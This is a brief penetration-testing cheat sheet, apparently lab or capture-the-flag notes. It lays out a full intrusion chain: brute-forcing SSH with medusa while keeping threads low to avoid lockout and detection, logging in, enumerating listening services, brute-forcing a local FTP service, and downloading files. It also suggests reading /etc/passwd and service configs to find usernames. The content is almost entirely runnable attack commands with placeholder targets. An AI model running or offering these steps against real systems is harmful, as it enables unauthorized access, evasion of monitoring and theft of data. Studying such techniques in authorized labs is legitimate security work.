# SSH → Internal Pivot → FTP

Brute SSH, keep `-t` low to avoid triggering lockout/detection:

```bash
medusa -h <TARGET> -n <PORT> -u <USER> -P <WORDLIST> -M ssh -t 3
```

Connect with found creds:

```bash
ssh <USER>@<TARGET> -p <PORT>
```

Once in, enum listening services:

```bash
netstat -tulpn | grep LISTEN
```

Confirm service on any unfamiliar port:

```bash
nmap localhost
```

Check `/home` for folder names — they often match service usernames. Then brute locally; use `127.0.0.1` explicitly to force IPv4:

```bash
medusa -h 127.0.0.1 -u <USER> -P <WORDLIST> -M ftp -t 5
```

Connect and pull files:

```bash
ftp ftp://<USER>:<PASS>@localhost
```

Inside FTP session: `ls` → `get <file>` → `exit`

> [!tip] username not known → check `/home`, `/etc/passwd`, service-specific config files before reaching for a list